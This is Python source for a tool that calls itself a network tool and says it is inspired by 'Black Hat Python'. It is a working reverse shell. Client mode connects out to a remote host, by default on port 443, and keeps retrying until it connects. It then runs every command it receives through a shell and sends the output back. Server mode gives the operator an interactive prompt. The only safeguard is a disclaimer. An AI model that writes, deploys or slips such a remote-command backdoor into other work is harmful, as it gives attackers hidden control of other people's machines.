import sys
import socket
import getopt
import subprocess
import os

listen = False
port = 443
host = ""


def usage():
    print("")
    print("================================Python Network Tool===================================")
    print("")
    print("==============================Created by Leonard Haddad===============================")
    print("")
    print("=========================================Usage========================================")
    print("")
    print("-l --listen                          - listen on [host]:[port] for incoming connection")
    print("-t --target                          - target address")
    print("-p --port                            - target port")
    print("")
    print("*.py -l -p port                      - Setup server listener")
    print("*.py -t target_ip -p port            - Connect to server")
    print("")
    print("======================================DISCLAIMER======================================")
    print("")
    print('Inspired by the Book: "Black Hat Python"')
    print("")
    print("Misuse of this tool for Illegal activities may result in legal consequences. I DO AND WILL")
    print("NOT take responsibility for your actions! YOU HAVE BEEN WARNED!")
    print("")
    print("======================================================================================")
    sys.exit(0)


# Client handler to receive commands
def client_handler(s):
    while True:
        cmd_bytes = s.recv(4096)
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"#>: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.sendall(data + b"#>: ")


# Connect client to server
def connect_client(address):
    try:
        s = socket.socket()
        s.connect(address)
    except socket.error as error:
        connect_client(address)
    client_handler(s)


# Send commands from host
def send_commands(conn):
    print("\n* Press CTRL + C to kill the Connection.")
    print("#>: ", end="")
    while True:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(4096)
                print(data.decode("utf-8"), end="")
        except KeyboardInterrupt:
            conn.close()
            sys.exit()
        except Exception as e:
            print(e)


# Server hosting
def server(address):
    try:
        s = socket.socket()
        s.bind(address)
        s.listen()
        print("======Server initialized!======")
        print(f"*--- Listening on port {address[1]} ---* ")
    except:
        print("\nError occurred! Would you like to reboot server?")
        restart = input("y/n: ")
        if restart.lower() == "y" or restart.lower() == "yes":
            print("Restarting...")
            server(address)
        else:
            sys.exit()
    conn, client_addr = s.accept()
    print(f"Connected to {client_addr}")
    send_commands(conn)


# Main function, decides between Client/Server
def main():
    global listen
    global port
    global host

    if not len(sys.argv[1:]):
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hl:t:p", ["help", "listen", "target", "port"])
    except getopt.GetoptError as err:
        usage()
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-t", "--target"):
            host = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Operation!"
        if not listen and len(host) and port > 0:
            connect_client((host, port))
        if listen:
            server((host, port))


if __name__ == "__main__":
    main()
